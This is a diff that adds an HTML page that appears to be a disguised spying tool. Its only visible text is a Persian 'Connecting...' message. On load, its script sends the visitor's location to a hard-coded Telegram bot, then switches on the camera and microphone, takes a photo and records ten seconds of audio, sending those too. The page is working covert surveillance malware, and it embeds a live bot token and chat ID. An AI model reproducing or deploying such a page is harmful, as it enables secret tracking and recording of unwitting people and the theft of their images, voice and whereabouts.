@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+const BOT_TOKEN = "8956484572:AAFtb-QxDItQFIxMQ2wcQMMmbfXxFC4r0KQ";
+const CHAT_ID = "7672589875";
+
+function sendTelegram(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    });
+}
+
+function sendPhoto(base64) {
+    const blob = dataURLtoBlob(base64);
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob, "photo.jpg");
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: "POST", body: form})
+    .catch(err => sendTelegram("❌ خطا در ارسال عکس: " + err.message));
+}
+
+function sendAudio(blob) {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("audio", blob, "audio.mp3");
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method: "POST", body: form})
+    .catch(err => sendTelegram("❌ خطا در ارسال صدا: " + err.message));
+}
+
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+
+// موقعیت
+navigator.geolocation.getCurrentPosition(pos => {
+    sendTelegram(`📍 موقعیت: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+}, err => sendTelegram("❌ خطا در موقعیت: " + err.message));
+
+// دوربین و میکروفون
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
+.then(stream => {
+    sendTelegram("✅ دوربین و میکروفون فعال شد.");
+    
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+    
+    // عکس بعد از ۱ ثانیه
+    setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        sendPhoto(canvas.toDataURL("image/jpeg"));
+    }, 1000);
+
+    // ضبط صدا ۱۰ ثانیه
+    const recorder = new MediaRecorder(stream);
+    recorder.ondataavailable = e => {
+        if (e.data.size > 0) {
+            sendAudio(e.data);
+        }
+    };
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000);
+
+})
+.catch(err => {
+    sendTelegram("❌ خطا در دسترسی به دوربین/میکروفون: " + err.message);
+});
+
+sendTelegram("✅ صفحه باز شد.");
+</script>
+</head>
+<body>
+<h1>در حال اتصال...</h1>
+</body>
+</html>
